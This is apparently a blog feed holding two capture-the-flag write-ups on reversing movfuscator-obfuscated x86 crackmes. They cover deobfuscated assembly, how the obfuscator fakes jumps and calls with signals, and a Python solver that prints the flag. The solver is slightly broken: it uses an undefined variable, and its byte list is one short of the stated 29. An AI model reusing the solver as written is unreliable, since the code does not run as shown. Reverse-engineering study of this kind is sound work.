&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Loops&lt;br&gt;
For example, let&amp;rsquo;s consider the following for loop&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;; i++)
    {
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It would compile to something like this&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;        mov i, 0
        jmp L2
    L1:
        ; ...
        add i, 1
    L2:
        cmp i, 10
        jl L1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the movfuscator equivalent is&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    master_loop:
        ; ...
        mov target, offset L2

    L1:
        cmp target, offset L1
        jnz L2

        ; ... loop body ...
        mov target, offset L2

    L2:
        cmp target, offset L2
        jnz next_block

        ; ... loop check ...
        mov target, offset L1

        ; ... remaining code ...
        ; throw a SIGILL to jump to master_loop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In fact, there is only one loop (the &lt;code&gt;master_loop&lt;/code&gt;).  So, it&amp;rsquo;s the &lt;code&gt;target&lt;/code&gt; variable that controls the flow.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;master_loop&lt;/code&gt; executes the following&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    master_loop:
        mov esp, NEW_STACK
        mov eax, sesp
        mov edx, 4
        add eax, edx
        push eax
        push dword [eax-4]
        push 0x804854e          ; return address after calling 0x805036a
        mov target, 0x805036a   ; main()
        ; ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Every basic block begins with the following sequence of instructions&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov eax, target
    cmp eax, 0xABCD
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For example,
&lt;img src=&#34;http://localhost:1313/images/swamp/basic_block.png&#34; alt=&#34;main_start&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The block is executed if the comparison is true. The function prologue consists of a sequence of register saves into the stack.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:08050544                 mov     eax, fp
    .text:08050549                 mov     stack_temp, eax
    .text:0805054E                 mov     eax, offset NEW_STACK
    .text:08050553                 mov     edx, on
    .text:08050559                 mov     data_p, eax
    .text:0805055E                 mov     eax, sel_data[edx*4]
    .text:08050565                 mov     edx, NEW_STACK
    .text:0805056B                 mov     edx, [edx-200068h]
    .text:08050571                 mov     [eax], edx
    .text:08050573                 mov     eax, NEW_STACK
    .text:08050578                 mov     edx, on
    .text:0805057E                 mov     data_p, eax
    .text:08050583                 mov     eax, sel_data[edx*4]
    .text:0805058A                 mov     edx, stack_temp
    .text:08050590                 mov     [eax], edx
     ... snip ...
    .text:08050709                 mov     eax, NEW_STACK
    .text:0805070E                 mov     edx, on
    .text:08050714                 mov     data_p, eax
    .text:08050719                 mov     eax, sel_data[edx*4]
    .text:08050720                 mov     edx, stack_temp
    .text:08050726                 mov     [eax], edx
    .text:08050728                 mov     edx, dword_81FD234
    .text:0805072E                 mov     [eax+4], edx

    .text:08050731                 mov     eax, offset fp
    .text:08050736                 mov     edx, on
    .text:0805073C                 mov     data_p, eax
    .text:08050741                 mov     eax, sel_data[edx*4]
    .text:08050748                 mov     edx, NEW_STACK
    .text:0805074E                 mov     [eax], edx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These instructions push &lt;strong&gt;fp&lt;/strong&gt;, &lt;strong&gt;R1&lt;/strong&gt;, &lt;strong&gt;R2&lt;/strong&gt;, &lt;strong&gt;R3&lt;/strong&gt;, &lt;strong&gt;F1&lt;/strong&gt;, &lt;strong&gt;dword_81FD234&lt;/strong&gt;, &lt;strong&gt;D1&lt;/strong&gt; in order.
Then assigns &lt;strong&gt;fp&lt;/strong&gt; to the current stack pointer. This looks like&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    push fp
    push R1
    push R2
    push R3
    push F1
    push D2
    push D1
    mov fp, esp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we can write the deobfuscated assembly&lt;/p&gt;
&lt;h2 id=&#34;deobfuscated-code&#34;&gt;Deobfuscated Code&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    _start:
        mov sesp, esp
        mov esp, NEW_STACK
        mov [esp-16+0], SIGSEGV
        mov [esp-16+4], offset sa_dispatch
        mov [esp-16+8], 0
        call _sigaction
        mov [esp-12+0], SIGILL
        mov [esp-12+4], offset sa_loop
        mov [esp-12+8], 0
        call _sigaction

    master_loop:
        mov esp, NEW_STACK
        mov eax, sesp
        mov edx, 4
        add eax, edx
        push ecx
        push dword [ecx-4]
        push 0x804854e
        mov target, 0x805036a

    _804854E:
        cmp target, 0x804854e
        jnz check_element

        push 0
        call _exit

    check_element:
        cmp target, 0x8048794
        jnz _80493B8

        push fp
        push R1
        push R2
        push R3
        push F1
        push D2
        push D1
        mov fp, esp
        sub esp, 12
        lea R3, [fp+9*4]
        lea R2, [fp+9*4]
        mov dl, [R2]
        mov [R3], dl
        mov R3, [fp+8*4]
        mov R2, 0x15
        add R3, R2
        mov [fp-4], R3
        mov R3, [fp-4]
        mov R2, 2
        xor R3, R2
        mov [fp-8], R3
        mov R3, [fp-8]
        mov R2, 0x1e
        sub R3, R2
        mov [fp-12], R3
        movsx R3, byte [fp-12]
        movsx R2, byte [fp+9*4]
        cmp R3, R2
        mov R0, 0
        cmovnz target, 0x80493B8
        cmovz target, 0x804959C

    _80493B8:
        cmp target, 0x80493B8
        mov R0, 1

        jnz _804959C

    _804959C:
        cmp target, 0x804959C
        jnz waste_time

        mov esp, fp
        ; pop regs ...
        pop fp
        mov target, [esp]


    waste_time:
        cmp target, 0x8049a88
        jnz _8049fc7

        ; ...
        mov target, 0x804fa1c

    _8049fc7:
        cmp target, 0x8049fc7
        jnz main
        ; ...

    main:
        cmp target, 0x805036a
        jnz _8051028

        push fp, R1, R2, R3, F1, D1
        mov fp, esp
        sub esp, 20*4
        lea R3, [fp-9*4]
        mov R2, 0x80540f0
        push 29
        push R2
        push R3
        call __inline_memcpy
        mov [fp-20*4], 29
        lea R3, [fp-19*4]
        mov R2, offset input
        push 40
        push R2
        push R3
        call __inline_memcpy
        mov [fp-4], 0
        push offset aGiveTheKeyIfYo
        call _puts
        add esp, 4
        push offset stdin@@GLIBC_2_0
        push 0x28
        lea R3, [fp-19*4]
        push R3
        call _fgets

        lea esp, [esp+4*3]

        mov [fp-4], 0
        mov target, 0x8052455

    _8051028:
        cmp target, 0x8051028
        jnz _8051985

        push 0x8051012
        mov target, 0x8049a88  ; waste_time

    _8051012:
        cmp target, 0x8051012
        jnz _8051985

        push esp
        mov R3, [fp-4]
        lea R2, [fp-19*4]
        add R2, R3
        movsz R0, byte [R2]
        push R0

        lea R2, [fp-9*4]
        add R3, R2
        movsx R0, byte [R3]
        push R0

        push 0x8051985
        mov target, 0x8048794   ; check_element

    _8051985:
        cmp target, 0x8051985
        jnz _8051f38

        lea esp, [esp+8]

        cmp R0, 0
        cmovz target, 0x8051fa6

        push 1
        call _exit

    _8051f38:
        lea esp, [esp+8]

    _8051fa6:
        cmp target, 0x8051fa6
        jnz _8052180

    _8052180:
        cmp target, 0x8052180
        jnz _8052455

        mov R3, [fp-4]
        mov R2, 1
        add R3, R2
        mov [fp-4], R3

    _8052455:
        cmp target, 0x8052455
        jnz _805294d

        mov R3, [fp-4]
        mov R2, [fp-20*4]
        cmp R3, R2
        cmovl target, 0x8051028

    _805294D:
        cmp target, 0x805294d
        jnz _8052b1f

        push offset aGoodJob
        call _puts

        lea esp, [esp+4]

    _8052B1F:
        mov R0, 0
        cmp target, 0x8052b1f
        jnz next

        mov esp, fp
        pop R1, R2, R3, F1, D1
        pop fp
        mov target, [esp]  ; return addr

    next:
        ; raise SIGILL now
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;analysis&#34;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;Cleaning up a bit, we have &lt;strong&gt;main&lt;/strong&gt; as&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    check_element:
        push fp, R1, R2, R3, F1, D2, D1
        mov fp, esp
        sub esp, 12

        lea R3, [fp+9*4]    ; arg2
        lea R2, [fp+9*4]
        mov dl, [R2]
        mov [R3], dl

        mov R3, [fp+8*4]    ; arg1
        mov R2, 0x15
        add R3, R2
        mov [fp-4], R3

        mov R3, [fp-4]
        mov R2, 2
        xor R3, R2
        mov [fp-8], R3

        mov R3, [fp-8]
        mov R2, 0x1e
        sub R3, R2
        mov [fp-12], R3

        movsx R3, byte [fp-12]
        movsx R2, byte [fp+9*4]
        cmp R3, R2
        mov R0, 0
        jz L3
        mov R0, 1
    L3:
        mov esp, fp
        ; pop regs
        pop fp
        ret

    main:
        push fp, R1 ...
        mov fp, esp
        sub esp, 80

        lea R3, [fp-36]
        mov R2, 0x80540f0
        push 29
        push R2
        push R3
        call __inline_memcpy

        mov [fp-80], 29

        lea R3, [fp-76]
        mov R2, offset input
        push 40
        push R2
        push R3
        call __inline_memcpy

        mov [fp-4], 0
        push offset aGiveTheKeyIfYo ; &amp;quot;Give the key, if you think you are worthy.&amp;quot;
        call puts
        add esp, 4

        push offset stdin@GLIBC_2_0
        push 0x28
        lea R3, [fp-76]
        push R3
        call fgets
        add esp, 12

        mov [fp-4], 0
        jmp _8052455

    _8051028:
        call waste_time

        mov R3, [fp-4]
        lea R2, [fp-76]
        add R2, R3
        movsx R0, byte [R2]
        push R0

        lea R2, [fp-36]
        add R3, R2
        movsx R0, byte [R3]
        push R0

        call check_element
        add esp, 8

        cmp R0, 0
        jz _8051fa6

        push 1
        call exit

    _8051fa6:
        mov R3, [fp-4]
        mov R2, 1
        add R3, R2
        mov [fp-4], R3

    _8052455:
        mov R3, [fp-4]
        mov R2, [fp-80]
        cmp R3, R2
        jl _8051028

    _805294D:
        push offset aGoodJob
        call puts
        add esp, 4

        mov esp, fp
        pop R1, R2, R3, F1, D1
        pop fp
        ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we have a for loop that iterates 29 times, calling &lt;strong&gt;waste_time&lt;/strong&gt; first and then &lt;strong&gt;check_element&lt;/strong&gt; with two params - magic[i] and input[i] where &lt;strong&gt;magic&lt;/strong&gt; is the array of 29 bytes at &lt;strong&gt;0x80540f0&lt;/strong&gt; and input is the array at &lt;strong&gt;fp-76&lt;/strong&gt;.&lt;br&gt;
&lt;strong&gt;check_element&lt;/strong&gt; checks whether &lt;strong&gt;(magic[i]+0x15^2)-0x1e == input[i]&lt;/strong&gt;. On mismatch the program terminates with exit code 1.&lt;/p&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    magic = [
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x37&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x72&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x3C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x82&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3B&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x84&lt;/span&gt;
    ]
    f = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; i: &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;((i+&lt;span style=&#34;color:#3677a9&#34;&gt;0x15&lt;/span&gt;^&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;)-&lt;span style=&#34;color:#3677a9&#34;&gt;0x1e&lt;/span&gt;)
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(f, x))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the flag is &lt;code&gt;flag{g00d_th1ng5_f0r_w41ting}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://drwho.virtadpt.net/files/mov.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MoV is Turing complete&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        <item>
        <title>Understanding the Movfuscator</title>
        <link>http://localhost:1313/post/understanding-the-movfuscator/</link>
        <pubDate>Thu, 14 Mar 2019 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/understanding-the-movfuscator/</guid>
        <description>&lt;p&gt;MoVfuscator is the PoC for the &lt;strong&gt;Turing Completeness of Mov instruction&lt;/strong&gt;.&lt;br&gt;
Yes, you guessed it right. It uses only mov&amp;rsquo;s, except for a few places.&lt;br&gt;
This makes reversing difficult, because the control flow is obfuscated.&lt;br&gt;
I&amp;rsquo;ll be analyzing the challenge &lt;strong&gt;Mov&lt;/strong&gt; of &lt;strong&gt;UTCTF&#39;19&lt;/strong&gt; using IDA Free.&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mega.nz/#!9BITlYBC!VST6DObLSdmTvlc9Yz6U6CsLrqXX32412uNm0L__PA0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MoV binary&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;the-stack&#34;&gt;The Stack&lt;/h2&gt;
&lt;p&gt;Movfuscator uses its own stack. The stack consists of an array of addresses. The stack looks like this&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/mov_stack.png&#34; alt=&#34;mo0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Each element of the stack is at an offset of &lt;strong&gt;0x200064&lt;/strong&gt; from it&amp;rsquo;s stack address. The stack begins at &lt;strong&gt;0x83f70e8&lt;/strong&gt; and it grows from high to low address.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/1.png&#34; alt=&#34;i1&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The stack pointer is saved in the variable &lt;strong&gt;sesp&lt;/strong&gt;. The variable &lt;strong&gt;NEW_STACK&lt;/strong&gt; stores the address of &lt;strong&gt;guard&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov esp, NEW_STACK              ; address of guard
    mov esp, [esp-0x200068]         ; address of A[n-1]
    mov esp, [esp-0x200068]         ; address of A[n-2]
    ;   ...
    ;   n times
    ;   ...
    ;   use esp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, &lt;code&gt;mov esp, [esp-0x200068]&lt;/code&gt;, subtracts 4 from esp.&lt;br&gt;
Now we can understand what &lt;strong&gt;start&lt;/strong&gt; does.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov dword [esp-4*4], SIGSEGV
    mov dword [esp-4*4+4], offset sa_dispatch
    mov dword [esp-4*4+8], 0
    call sigaction

    mov dword [esp-3*4], SIGILL
    mov dword [esp-3*4+4], offset sa_loop
    mov dword [esp-3*4+8], 0
    call sigaction

    ;
    ;   ...
    ;
    .plt:08048210                 public dispatch
    .plt:08048210 dispatch        proc near               ; DATA XREF: .data:sa_dispatch↓o
    .plt:08048210                 mov     esp, NEW_STACK
    .plt:08048216                 jmp     function
    .plt:08048216 dispatch        endp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Movfuscator uses &lt;strong&gt;SIGSEGV&lt;/strong&gt; to execute a function, and &lt;strong&gt;SIGILL&lt;/strong&gt; to execute a &lt;strong&gt;JMP&lt;/strong&gt; instruction which jumps to &lt;strong&gt;master_loop&lt;/strong&gt;. Because we can&amp;rsquo;t mov to &lt;strong&gt;eip&lt;/strong&gt;, which is invalid in x86.&lt;/p&gt;
&lt;p&gt;Execution is controlled using the &lt;strong&gt;on&lt;/strong&gt; variable. This is a boolean variable that determines whether a statement will be executed or not.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/2.png&#34; alt=&#34;i2&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;master_loop&lt;/strong&gt; sets the value of &lt;strong&gt;on&lt;/strong&gt; and then disables &lt;strong&gt;toggle_execution&lt;/strong&gt;. This is the structure of if statement.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;logic_if&lt;/span&gt;(condition, dest, src)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (condition)
            dest = src
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt;
            discard = src
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It then adds &lt;strong&gt;sesp&lt;/strong&gt; with 4 and stores the sum in &lt;strong&gt;stack_temp&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;push&#34;&gt;Push&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/3.png&#34; alt=&#34;i3&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The array &lt;strong&gt;sel_data&lt;/strong&gt; contains two members - &lt;strong&gt;discard&lt;/strong&gt; and &lt;strong&gt;data_p&lt;/strong&gt;. This is a MUX which selects &lt;strong&gt;data_p&lt;/strong&gt; if &lt;strong&gt;on&lt;/strong&gt; is set. So, if on is set, &lt;strong&gt;eax&lt;/strong&gt; contains the address of &lt;strong&gt;NEW_STACK&lt;/strong&gt;. And the value of &lt;strong&gt;esp-4&lt;/strong&gt; is stored in &lt;strong&gt;NEW_STACK&lt;/strong&gt;, which is the stack pointer. And then the value of &lt;strong&gt;stack_temp&lt;/strong&gt; is stored in the current stack pointer.&lt;/p&gt;
&lt;p&gt;The above set of instructions are equivalent to&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov eax, [stack_temp]
    sub esp, 4
    mov [esp], eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It can also be represented as&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    push dword [stack_temp]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The sequnce of instructions until &lt;strong&gt;0x0804843C&lt;/strong&gt; do the following&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov eax, [sesp]
    add eax, 4
    push eax
    push dword [sesp]
    push 0x880484fe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/4.png&#34; alt=&#34;i4&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It conditionally sets the value of &lt;strong&gt;target&lt;/strong&gt; to &lt;strong&gt;branch_temp&lt;/strong&gt;. The &lt;strong&gt;target&lt;/strong&gt; variable is the destination an unconditional jump. In this code, the &lt;strong&gt;target&lt;/strong&gt; is set to &lt;strong&gt;0x88048744&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s see how jump&amp;rsquo;s are implemented.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    on = 1
    ...
    target = jump_destination
    ; save registers R, F, D
    on = 0
    ...
    if (fetch_addr == target)
    {
        ; restore registers R, F, D
        on = 1
    }
    ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/5.png&#34; alt=&#34;i5&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The above code saves the registers.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/6.png&#34; alt=&#34;i6&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It now checks if the fetch address equals the address contained in &lt;strong&gt;target&lt;/strong&gt;. The &lt;strong&gt;equal-to&lt;/strong&gt; comparison is computed for each byte and the result is the logical-and of the four comparisons. The result of the comparison is stored in the boolean variable &lt;strong&gt;b0&lt;/strong&gt;.&lt;br&gt;
Now if &lt;strong&gt;b0&lt;/strong&gt; is set, the registers are restored and the &lt;strong&gt;on&lt;/strong&gt; variable is set.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/7.png&#34; alt=&#34;i7&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;This is equivalent to the following if the &lt;strong&gt;on&lt;/strong&gt; variable is set.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    push 0
    call _exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You must be wondering how I deduced the call instruction. Here is it&lt;/p&gt;
&lt;h3 id=&#34;function-call&#34;&gt;Function Call&lt;/h3&gt;
&lt;p&gt;Function calls are implemented using the &lt;strong&gt;SIGSEGV&lt;/strong&gt; signal. The array &lt;strong&gt;fault&lt;/strong&gt; is defined like this&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .data:085F7198 fault           dd offset no_fault      ; DATA XREF: _start+51F↑r
    .data:085F719C                 dd 0

    .data:085F71A0 no_fault        dd 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, &lt;strong&gt;fault&lt;/strong&gt; when indexed with &lt;strong&gt;on&lt;/strong&gt; returns 0 if &lt;strong&gt;on&lt;/strong&gt; is set, otherwise a valid address. This return value is dereferenced which results in a &lt;strong&gt;SIGSEGV&lt;/strong&gt; (Segmentation Fault) if its zero.&lt;/p&gt;
&lt;p&gt;But since, the value of &lt;strong&gt;target&lt;/strong&gt; is &lt;strong&gt;0x88048744&lt;/strong&gt;. The control &lt;em&gt;jumps&lt;/em&gt; to &lt;strong&gt;main&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;main&lt;/strong&gt;, the registers are restored and the &lt;strong&gt;on&lt;/strong&gt; flag is set. After that it pushes &lt;strong&gt;fp&lt;/strong&gt;, &lt;strong&gt;R1&lt;/strong&gt;, &lt;strong&gt;R2&lt;/strong&gt;, &lt;strong&gt;R3&lt;/strong&gt;, &lt;strong&gt;F1&lt;/strong&gt;, &lt;strong&gt;dword_804e04c&lt;/strong&gt;, &lt;strong&gt;D1&lt;/strong&gt; into the stack&lt;/p&gt;
&lt;h3 id=&#34;the-function-prologue&#34;&gt;The function prologue&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/8.png&#34; alt=&#34;i8&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It first assigns the frame pointer &lt;strong&gt;fp&lt;/strong&gt; to the current stack pointer and allocates 37 dwords (148 bytes) from the stack. This is equivalent to the following x86&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov ebp, esp    ;   ebp is **fp**
    sub esp, 148
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/utctf/mov/9.png&#34; alt=&#34;i9&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Computes &lt;strong&gt;fp-19*4&lt;/strong&gt; and stores the value of &lt;strong&gt;R3&lt;/strong&gt; into the address. So, this is basically&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov R3, 0
    mov [fp-19*4], R3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great ! So, we have a dword at &lt;strong&gt;fp-0x4c&lt;/strong&gt; initialized to 0.&lt;br&gt;
Then we have an array of bytes at &lt;strong&gt;fp-0x47&lt;/strong&gt; initialized as follows&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    mov R0, 0x1a
    mov byte [fp-18*4], R0
    mov R0, 0x19
    mov byte [fp-0x47], R0
    mov R0, 11
    mov byte [fp-0x46], R0
    mov R0, 0x31
    mov byte [fp-0x45], R0
    mov R0, 6
    mov byte [fp-17*4], R0
    mov R0, 4
    mov byte [fp-0x43], R0
    mov R0, 0x18
    mov byte [fp-0x42], R0
    mov R0, 0x10
    mov byte [fp-0x41], R0
    mov R0, 10
    mov byte [fp-16*4], R0
    mov R0, 0x33
    mov byte [fp-0x3f], R0
    mov R0, 0x19
    mov byte [fp-0x3e], R0
    mov R0, 10
    mov byte [fp-0x3d], R0
    mov R0, 0x33
    mov byte [fp-15*4], R0
    mov R0, 0
    mov byte [fp-0x3b], R0
    mov R0, 10
    mov byte [fp-0x3a], R0
    mov R0, 0x3c
    mov byte [fp-0x39], R0
    mov R0, 0x19
    mov byte [fp-14*4], R0
    mov R0, 13
    mov byte [fp-0x37], R0
    mov R0, 6
    mov byte [fp-0x36], R0
    mov R0, 0x19
    mov byte [fp-0x35], R0
    mov R0, 0x3c
    mov byte [fp-13*4], R0
    mov R0, 14
    mov byte [fp-0x33], R0
    mov R0, 0x10
    mov byte [fp-0x32], R0
    mov R0, 0x3c
    mov byte [fp-0x31], R0
    mov R0, 0x10
    mov byte [fp-12*4], R0
    mov R0, 12
    mov byte [fp-0x2f], R0
    mov R0, 0x32
    mov byte [fp-0x2e], R0
    mov R0, 10
    mov byte [fp-0x2d], R0
    mov R0, 0x14
    mov byte [fp-11*4], R0
    mov R0, 13
    mov byte [fp-0x2b], R0
    mov R0, 6
    mov byte [fp-0x2a], R0
    mov R0, 0x19
    mov byte [fp-0x29], R0
    mov R0, 0x3c
    mov byte [fp-10*4], R0
    mov R0, 0x19
    mov byte [fp-0x27], R0
    mov R0, 6
    mov byte [fp-0x26], R0
    mov R0, 0x33
    mov byte [fp-0x25], R0
    mov R0, 4
